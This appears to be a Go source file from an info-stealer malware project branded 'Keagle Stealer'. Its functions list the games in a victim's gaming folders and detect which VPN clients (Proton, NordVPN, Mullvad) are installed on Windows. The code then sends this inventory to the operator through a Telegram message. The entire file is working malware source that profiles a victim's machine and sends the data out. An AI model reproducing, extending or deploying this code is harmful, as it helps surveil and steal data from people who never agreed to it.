package scripts

import (
	"fmt"
	"os"
)

func GetSoftware() {

	msgGames := CheckGamingPaths()
	msgVpn := CheckVpnPaths()

	message := fmt.Sprintf(
		"<b><u>🦅 Keagle Stealer</u> - Software Download </b>\n\n"+
			"🎮<b> Video Games:</b>  <i>%s</i>\n\n"+
			"🌐<b> Virtual Private Network:</b> <i>%s</i>\n",
		msgGames, msgVpn)

	r := SendTelegramMessage(message)

	if r == true {
	}

}

func CheckGamingPaths() string {

	var (
		videoGames []string
		msgGames   string
		countGames int
	)

	pathsG := GetGamingPath()

	for _, path := range pathsG {

		t, _ := os.ReadDir(path)

		for _, e := range t {

			videoGames = append(videoGames, e.Name())

		}

	}

	for _, i := range videoGames {

		totalGames := len(videoGames)
		countGames += 1

		if countGames == totalGames {

			msgGames += fmt.Sprintf("%s", i)

		} else {

			msgGames += fmt.Sprintf("%s, ", i)

		}

	}

	return msgGames
}

func CheckVpnPaths() string {

	var (
		vpn      []string
		msgVpn   string
		countVpn int
	)

	pathsG := GetVpnPath()

	for _, path := range pathsG {
		_, err := os.ReadDir(path)

		if err != nil {

			continue

		} else {

			if path == "C:\\Program Files\\Proton\\VPN" {
				vpn = append(vpn, "Proton VPN")

			} else if path == "C:\\Program Files\\NordVPN " {
				vpn = append(vpn, "Nord VPN")

			} else if path == "C:\\Program Files\\Mullvad VPN" {
				vpn = append(vpn, "Mullvad VPN")
			}
		}

	}

	for _, i := range vpn {

		totalVpn := len(vpn)
		countVpn += 1

		if countVpn == totalVpn {

			msgVpn += fmt.Sprintf("%s", i)

		} else {

			msgVpn += fmt.Sprintf("%s, ", i)

		}

	}

	return msgVpn
}
